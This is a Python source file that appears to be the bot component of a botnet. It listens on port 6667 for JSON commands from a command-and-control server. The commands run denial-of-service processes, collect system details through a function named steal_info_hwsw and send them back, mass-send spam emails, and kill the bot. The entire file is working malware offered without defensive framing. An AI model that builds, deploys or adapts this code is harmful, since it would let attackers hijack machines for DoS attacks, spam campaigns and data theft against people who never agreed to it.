import socket
import subprocess
import json
import os, signal
from .send_email import send_email
CURRENT_PROCESSES = []


def get_my_ip():
    cmd = ['hostname', '-I']
    my_ip = exec_cmd(cmd)
    return my_ip[:-2]

def exec_cmd(cmd, wait=False):
    if wait:
        proc = subprocess.Popen(cmd, shell=False, stdin=None, stdout=None, stderr=None,close_fds=True)
        CURRENT_PROCESSES.append(proc)
        return 1
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    result = o.decode('ascii')
    return result

def steal_info_hwsw():
    return {
        "uname": exec_cmd(["uname", "-a"]).split('\n'),
        "lscpu": exec_cmd(["lscpu"]).split('\n'),
        "network": exec_cmd(["netstat", "-i"]).split('\n')
    }

def handle_irc_connection(server_socket):
    conn, address = server_socket.accept()
    print("[+] Got connection from: " + str(address))

    while True:
        data = json.loads(conn.recv(1024))
        # print("from C&C: " + str(data))
        action = data["action"]
        try:
            if action == "email_batch":
                content = json.loads(data["content"])
            else:
                content = data["content"]
        except: pass
        
        
        if not data or action == "kill" or action == 'exit':
            break
        elif action == 'idle':
            print("[+] Making bot idle")
            [proc.kill() for proc in CURRENT_PROCESSES]
            continue
        if action == "dos":
            print("[+] Executing dos as C&C asked")
            exec_cmd(content.split(), wait=True)
        elif action == "hwsw":
            print("[+] Extracting info about hw and sw as C&C asked")
            infos = steal_info_hwsw()
            conn.send(json.dumps(infos, indent=2).encode('utf-8'))
        elif action == "email_batch":
            print("[+] Sending batch email")
            for receiver in content["receivers"]:
                send_email(receiver, content["subject"], content["plaintext"], content["html"])
    conn.close()  # close the connection


    if action == 'exit':
        return handle_irc_connection(server_socket)
    # else 
    print("[-] Killing bot")
    [proc.kill() for proc in CURRENT_PROCESSES]
    return 1

def set_up_irc(ppid):
    host = get_my_ip()
    port = 6667
    clients = 1

    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    print(f"-- irc listening ({host}, {port}) --")

    server_socket.listen(clients)

    handle_irc_connection(server_socket)
    os.kill(ppid, signal.SIGTERM)
    return 1